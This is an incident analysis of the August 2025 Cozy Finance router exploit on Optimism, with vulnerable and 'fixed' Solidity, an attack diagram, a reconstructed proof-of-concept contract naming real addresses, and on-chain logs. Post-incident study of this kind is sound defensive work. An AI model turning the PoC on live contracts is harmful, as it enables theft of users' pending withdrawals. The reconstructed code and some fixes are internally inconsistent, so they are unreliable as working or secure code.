# Cozy Finance — Business Logic Vulnerability Analysis: Missing Receiver Validation

| Field | Details |
|------|------|
| **Date** | 2025-08-29 |
| **Protocol** | Cozy Finance (Safety Module) |
| **Chain** | Optimism (OP Mainnet) |
| **Loss** | ~$427,606 USDC.e (377,084 stataOptUSDC → 427,606 USDC.e conversion) |
| **Attacker** | [0xce19...8e66](https://optimistic.etherscan.io/address/0xce196f0a4f0c08e152ae66ecbc06675f44f68e66) |
| **Attack Contract (CozyRouter)** | [0x1dbA...b466](https://optimistic.etherscan.io/address/0x1dbA25BDA38b2A761141DD23917bd294d679b466) |
| **Attack Tx** | [0x71e7...0517](https://optimistic.etherscan.io/tx/0x71e72cae2149920bc89ae3287edf8c7e65d454d7fd5e24b590c1b4ea36c0a517) |
| **Vulnerable Contract (Safety Module)** | [0x5624...53d8](https://optimistic.etherscan.io/address/0x562460d8cfb40ada3ea91d8cf98eaf25d53d53d8) |
| **Root Cause** | Missing validation of the `receiver_` argument in `unwrapWrappedAssetViaConnectorForWithdraw` |
| **PoC Source** | DeFiHackLabs (no file registered — reconstructed from on-chain data) |
| **Block Number** | 140421918 |
| **Timestamp** | 2025-08-29 04:43:33 UTC |

---

## 1. Vulnerability Overview

Cozy Finance's Safety Module uses a two-step process when users withdraw staked assets:

1. **redeem()**: Registers a withdrawal request in the queue and issues a unique `redemptionId`
2. **completeWithdraw()**: Finalizes the actual withdrawal after the waiting period has elapsed

The victim (0xeabd74ee...) had registered a withdrawal request (redemptionId = 6) for 377,084 stataOptUSDC. The attacker identified the ID of this pending withdrawal request, then executed a multicall that sequentially invoked CozyRouter's `completeWithdraw` and `unwrapWrappedAssetViaConnectorForWithdraw`.

Core vulnerability: During the process of unwrapping yield-bearing tokens (stataOptUSDC → aOptUSDC → USDC.e), `unwrapWrappedAssetViaConnectorForWithdraw` **performed no validation whatsoever** to confirm that the `receiver_` parameter matched the actual withdrawal requester. As a result, 377,084 stataOptUSDC was converted to 427,606 USDC.e via Aave and transferred to the attacker's address.

---

## 2. Vulnerable Code Analysis

### 2.1 completeWithdraw — Insufficient Caller Validation

```solidity
// ❌ Vulnerable code — CozyRouter.completeWithdraw()
function completeWithdraw(
    address safetyModule_,
    uint64 redemptionId_   // Anyone can specify an arbitrary redemptionId
) external {
    // No check that msg.sender is the original withdrawal requester ❌
    // Anyone can complete the pending withdrawal identified by redemptionId_
    ISafetyModule(safetyModule_).completeWithdraw(redemptionId_);
    // Upon completion, assets are temporarily held by this contract (CozyRouter)
}
```

**Issue**: There is no logic to verify the original owner of the withdrawal request identified by `redemptionId_`. Once the withdrawal is completed, assets are temporarily held by CozyRouter and passed to the next step (unwrap).

---

### 2.2 unwrapWrappedAssetViaConnectorForWithdraw — Missing receiver_ Validation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — CozyRouter.unwrapWrappedAssetViaConnectorForWithdraw()
function unwrapWrappedAssetViaConnectorForWithdraw(
    address connector_,  // Unwrapping connector address
    address receiver_    // Final recipient — no validation! ❌
) external {
    // No validation that connector_ is the connector held by the actual withdrawal requester ❌
    // No validation that receiver_ matches the original withdrawal requester (connector_) ❌
    
    uint256 wrappedBalance = IWrappedAsset(connector_).balanceOf(address(this));
    // Unwraps the entire wrapped token balance held by CozyRouter and sends to receiver_
    IConnector(connector_).unwrap(wrappedBalance, receiver_);
    // → Attacker sets receiver_ = their own address to steal victim's funds
}
```

**Fixed code (✅)**:

```solidity
// ✅ Fixed code — receiver_ and caller validation added
function unwrapWrappedAssetViaConnectorForWithdraw(
    address connector_,
    address receiver_
) external {
    // Fix 1: Verify that the caller is the actual withdrawal owner (connector_) ✅
    // connector_ must be the address associated with the victim's withdrawal request
    if (msg.sender != connector_) revert Unauthorized();
    
    // Fix 2: Verify that receiver_ equals connector_ (only self-redemption allowed) ✅
    if (receiver_ != msg.sender) revert InvalidReceiver();
    
    uint256 wrappedBalance = IWrappedAsset(connector_).balanceOf(address(this));
    IConnector(connector_).unwrap(wrappedBalance, receiver_);
}
```

**Or, blocking at the completeWithdraw stage (✅)**:

```solidity
// ✅ Add redemptionId owner validation to completeWithdraw
function completeWithdraw(
    address safetyModule_,
    uint64 redemptionId_
) external {
    // Look up the original owner of the request corresponding to redemptionId_ ✅
    address owner = ISafetyModule(safetyModule_).redemptionOwner(redemptionId_);
    
    // Caller must be the original withdrawal requester ✅
    if (msg.sender != owner) revert NotRedemptionOwner();
    
    ISafetyModule(safetyModule_).completeWithdraw(redemptionId_);
}
```

**Issue**: Both `completeWithdraw` and `unwrapWrappedAssetViaConnectorForWithdraw` lack authorization, allowing an attacker to specify an arbitrary `redemptionId` and `receiver_` address to intercept another user's pending withdrawal.

---

## 3. Attack Flow

### 3.1 Preconditions

- The victim (0xeabd74ee...) had already called `redeem()` and 377,084 stataOptUSDC was pending withdrawal under redemptionId = 6
- The withdrawal delay period (withdrawDelay) had fully elapsed
- The attacker had prepared 0.096 ETH in gas fees on Optimism via Orbiter Finance

### 3.2 Execution Steps

```
1. Attacker calls CozyRouter's multicall (aggregate3)
   └─ Call 1: completeWithdraw(SafetyModule=0x5624..., redemptionId=6)
   └─ Call 2: unwrapWrappedAssetViaConnectorForWithdraw(
                connector=0xeabd74ee...,  ← victim's address
                receiver_=0xce196f...    ← attacker's address
              )
```

**Attack Flow Diagram**:

```
Attacker (0xce196f...)
      │
      │ multicall (aggregate3)
      ▼
┌─────────────────────────────────────────┐
│  CozyRouter (0x1dbA25BD...)             │
│                                         │
│  [1] completeWithdraw(SM, redemptionId=6)│
│      └─ Completes victim's pending withdrawal│
│      └─ Receives 377,084 stataOptUSDC   │
│                                         │
│  [2] unwrapWrappedAssetViaConnector...  │
│      connector = victim's address        │
│      receiver_ = attacker's address ← ❌ no validation│
└─────────────────────────────────────────┘
      │
      │ connector.unwrap(377084 stataOptUSDC, attacker)
      ▼
┌─────────────────────────────────────────┐
│  stataOptUSDC Connector                 │
│  stataOptUSDC → aOptUSDC unwrap         │
│  377,084 stataOptUSDC → 420,423 aOptUSDC│
└─────────────────────────────────────────┘
      │
      │ Aave withdraw(aOptUSDC, receiver=attacker)
      ▼
┌─────────────────────────────────────────┐
│  Aave V3 Pool (0x794a61...)             │
│  420,423 aOptUSDC burned                │
│  → 427,606 USDC.e withdrawn             │
└─────────────────────────────────────────┘
      │
      │ 427,606 USDC.e
      ▼
Attacker (0xce196f...) receives funds
      │
      │ Orbiter/Stargate bridge
      ▼
Ethereum Mainnet → Tornado Cash deposit
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Victim loss (stataOptUSDC) | 377,084 stataOptUSDC |
| Attacker gain (USDC.e) | 427,606 USDC.e |
| Total protocol loss | ~$427,606 |

---

## 4. PoC Core Logic Reconstruction

*(No official DeFiHackLabs file — reverse-engineered from on-chain transactions)*

```solidity
// Cozy Finance Business Logic Exploit Reconstruction
// Attack Date: 2025-08-29 | Block: 140421918
// Attacker: 0xce196F0a4f0c08E152aE66eCBC06675f44F68E66
// Loss: ~$427,606 USDC.e

contract CozyFinanceExploit {
    address constant COZY_ROUTER  = 0x1dbA25BDA38b2A761141DD23917bd294d679b466;
    address constant SAFETY_MODULE = 0x562460d8cfb40ada3ea91d8cf98eaf25d53d53d8;
    address constant VICTIM        = 0xeabd74ee7399b38d63069039bbd9f1c2fcc8eb88;
    address constant USDC_E        = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;

    function exploit() external {
        // [Step 1] CozyRouter.multicall — execute two functions atomically
        // Method: aggregate3(calls[]) — processed in a single Tx via multicall
        
        ICozyRouter.Call3[] memory calls = new ICozyRouter.Call3[](2);
        
        // [Step 1-1] Anyone can complete the victim's pending redemption (ID=6)
        // completeWithdraw(safetyModule, redemptionId)
        // → SafetyModule does not verify that msg.sender owns redemptionId=6
        calls[0] = ICozyRouter.Call3({
            target: SAFETY_MODULE,
            allowFailure: false,
            callData: abi.encodeWithSignature(
                "completeWithdraw(address,uint64)",
                SAFETY_MODULE,   // SafetyModule address
                uint64(6)        // victim's redemptionId
            )
        });
        
        // [Step 1-2] Unwrap function — specify attacker's address as receiver_
        // connector_: victim's address (holds stataOptUSDC)
        // receiver_:  attacker's address ← ❌ the key point is that this value is not validated
        calls[1] = ICozyRouter.Call3({
            target: address(this), // CozyRouter internal function
            allowFailure: false,
            callData: abi.encodeWithSignature(
                "unwrapWrappedAssetViaConnectorForWithdraw(address,address)",
                VICTIM,       // connector_ = victim's address
                address(this) // receiver_ = attacker's address
            )
        });
        
        // Execute multicall:
        // → completeWithdraw: transfers 377,084 stataOptUSDC from SafetyModule to CozyRouter
        // → unwrap: converts stataOptUSDC → aOptUSDC → USDC.e, sends to attacker
        ICozyRouter(COZY_ROUTER).aggregate3(SAFETY_MODULE, abi.encode(calls));
        
        // [Step 2] Confirm profit: 427,606 USDC.e acquired
        uint256 profit = IERC20(USDC_E).balanceOf(address(this));
        // → Bridge to Ethereum via Orbiter Finance → Stargate
        // → Laundered via Tornado Cash
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing receiver_ argument validation (unwrapWrappedAssetViaConnectorForWithdraw) | CRITICAL | CWE-285 |
| V-02 | No caller authentication in completeWithdraw | HIGH | CWE-284 |
| V-03 | Insufficient ownership tracking of pending redemptions | HIGH | CWE-862 |

### V-01: Missing receiver_ Argument Validation

- **Description**: The `unwrapWrappedAssetViaConnectorForWithdraw(connector_, receiver_)` function does not validate that `receiver_` matches `connector_` (the original withdrawal requester).
- **Impact**: Any arbitrary caller can intercept a victim's pending withdrawal and divert funds to their own address.
- **Attack Conditions**: (1) Identify the victim's pending redemptionId, (2) confirm the withdrawal delay has elapsed, (3) chain completeWithdraw + unwrap calls in a single transaction

### V-02: No Caller Authentication in completeWithdraw

- **Description**: The `completeWithdraw(safetyModule_, redemptionId_)` function does not verify that `msg.sender` is the original owner of the given redemptionId.
- **Impact**: Anyone can complete another user's pending withdrawal; while the completed assets are temporarily held by CozyRouter, they can be stolen.
- **Attack Conditions**: Exploitable at any time when a publicly queryable pending redemptionId exists

### V-03: Insufficient Pending Redemption Ownership Tracking

- **Description**: In the two-step flow for processing pending withdrawals in the Safety Module, the CozyRouter layer does not preserve or validate redemption owner information.
- **Impact**: An authorization bypass occurring at the router layer circumvents the security of the Safety Module itself.
- **Attack Conditions**: Forms a complete attack chain in combination with V-01 and V-02

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix for unwrapWrappedAssetViaConnectorForWithdraw
function unwrapWrappedAssetViaConnectorForWithdraw(
    address connector_,
    address receiver_
) external {
    // [Fix 1] Verify that the caller is the actual withdrawal owner
    bytes32 withdrawalKey = keccak256(abi.encode(msg.sender, connector_));
    if (!pendingWithdrawals[withdrawalKey]) revert NotWithdrawalOwner();
    
    // [Fix 2] receiver_ must be the original withdrawal requester
    if (receiver_ != msg.sender) revert InvalidReceiver();
    
    // [Fix 3] Delete mapping immediately after processing (reentrancy prevention)
    delete pendingWithdrawals[withdrawalKey];
    
    uint256 wrappedBalance = IWrappedAsset(connector_).balanceOf(address(this));
    IConnector(connector_).unwrap(wrappedBalance, receiver_);
}

// ✅ Fix for completeWithdraw — redemption owner validation
function completeWithdraw(
    address safetyModule_,
    uint64 redemptionId_
) external {
    // Look up the original owner corresponding to the redemptionId
    Redemption memory r = ISafetyModule(safetyModule_).redemptions(redemptionId_);
    
    // Caller must be the original withdrawal requester
    if (msg.sender != r.owner) revert NotRedemptionOwner();
    
    ISafetyModule(safetyModule_).completeWithdraw(redemptionId_);
    
    // Record pending withdrawal state (for validation in the unwrap step)
    bytes32 key = keccak256(abi.encode(msg.sender, r.connector));
    pendingWithdrawals[key] = true;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing receiver_ validation | Cross-validate all externally supplied addresses against on-chain state. Apply the "Never Trust, Always Verify" principle |
| V-02: Missing caller authentication | Apply an `onlyRedemptionOwner` modifier to the withdrawal completion function. Maintain a redemptionId → owner mapping |
| V-03: Ownership discontinuity in two-step flow | Record pending state in the contract between step 1 (completeWithdraw) and step 2 (unwrap), then validate and delete it in step 2 |
| General: Multicall abuse prevention | Maintain per-subcall context (e.g., the current redemption owner being processed) within multicalls, and share context across subcalls to block cross-call attacks |

---

## 7. Lessons Learned

1. **Always validate externally supplied addresses**: Parameters that designate fund recipients — such as `receiver_`, `owner`, and `recipient` — must be cross-validated against on-chain state (the actual owner). Vulnerability classes CWE-285 and CWE-284 are among the most frequently occurring types in DeFi.

2. **Security design for the two-step (queue-complete) withdrawal pattern**: Owner information registered during the queuing step must remain consistent through to the completion step. End-to-end review is required to ensure that authentication logic is not omitted when a router wraps a Safety Module.

3. **Multicall becomes an atomic attack vector**: The `aggregate3` / `multicall` pattern can create new attack paths when functions are composed, even if each individual function is safe in isolation. In particular, when using multicall in router contracts that temporarily hold state, the caller context of each subcall must be tracked separately.

4. **Publicly visible state (pending redemptions) is always a target**: Pending state exposed on-chain (redemptionId, amount, whether the waiting period has expired) is queryable by anyone. Access control is mandatory whenever an attack is feasible using only public information.

5. **DeFi insurance/protection protocols must protect themselves**: Cozy Finance operates a protection market that hedges smart contract risk for other protocols. This incident is an ironic lesson — a protocol designed to provide protection was itself exploited by a basic access control vulnerability.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Value | Notes |
|------|-----|------|
| Victim's stataOptUSDC balance (just before attack) | 378,059,108,465 (6 decimals → 378,059) | Queried at block just before attack |
| Completed withdrawal amount (stataOptUSDC) | 377,084,260,866 ($377,084) | Redeem event |
| aOptUSDC burned after unwrapping | 420,423,860,247 ($420,391) | Burn event |
| USDC.e received by attacker | 427,606,139,051 ($427,606) | Transfer event (Aave → attacker) |
| USDC.e received by attacker (separate Transfer) | 427,606,139,051 (duplicate confirmation) | logIndex 9 |

### 8.2 On-Chain Event Log Sequence

| logIndex | Contract | Event | Description |
|----------|---------|--------|------|
| 0x02 | 0x41b75372 (stataOptUSDC) | Transfer | CozyRouter → victim's address (completeWithdraw finalized) |
| 0x03 | 0xbbf3a80c (CozyRouter?) | Redeem | redemptionId=6, owner=victim, safety_module=0x5624 |
| 0x04 | 0x41b75372 (stataOptUSDC) | Transfer | victim → 0x0 (burned) |
| 0x05 | 0x41b75372 (stataOptUSDC) | Withdraw | Withdrawal with attacker specified as receiver |
| 0x06 | 0x794a6135 (Aave Pool) | ReserveDataUpdated | USDC.e reserve updated |
| 0x07 | 0x625e7708 (aOptUSDC) | Transfer | CozyRouter (stataToken) → 0x0 (aOptUSDC burned) |
| 0x08 | 0x625e7708 (aOptUSDC) | Burn | 420,423 aOptUSDC burn recorded |
| 0x09 | 0x7f5c764c (USDC.e) | Transfer | aOptUSDC → attacker (427,606 USDC.e) |
| 0x0a | 0x794a6135 (Aave Pool) | Withdraw | Aave withdrawal completed event |

### 8.3 Precondition Verification

| Condition | Value | Status |
|------|-----|------|
| Victim's redemptionId=6 registration | Confirmed via Redeem event | ✅ Registered |
| Victim's stataOptUSDC balance (block 140421917, just before attack) | 378,059,108,465 | ✅ Sufficient |
| Attacker's gas fee preparation | 0.096 ETH received from Orbiter Finance (block 140398257) | ✅ Ready |
| Withdrawal delay elapsed | completeWithdraw succeeded at block 140421918 | ✅ Elapsed |

### 8.4 Fund Flow Path

```
Optimism:
  Orbiter Finance → Attacker (0.096 ETH gas fee)
  Attacker → CozyRouter (multicall execution)
  Victim's stataOptUSDC → Attacker's USDC.e (427,606)
  Attacker → Stargate Finance (USDC.e bridge)
  Attacker → Orbiter Finance Router (ETH bridge)

Ethereum Mainnet:
  Attacker → Tornado Cash (laundering)
```

---

## References

- [Verichains — Cozy Protocol Incident Analysis](https://blog.verichains.io/p/cozy-protocol-incident)
- [Decurity Twitter Alert](https://x.com/DecurityHQ/status/1961810726164533602)
- [Attack Transaction (OP Etherscan)](https://optimistic.etherscan.io/tx/0x71e72cae2149920bc89ae3287edf8c7e65d454d7fd5e24b590c1b4ea36c0a517)
- [Attacker Address (OP Etherscan)](https://optimistic.etherscan.io/address/0xce196f0a4f0c08e152ae66ecbc06675f44f68e66)
- [Cozy Safety Module Developer Docs](https://csm-docs.cozy.finance/developer-guides/safety-module-redemptions-withdrawals)
- [Cozy Finance GitHub](https://github.com/Cozy-Finance)
- CWE-285: Improper Authorization
- CWE-284: Improper Access Control
- CWE-862: Missing Authorization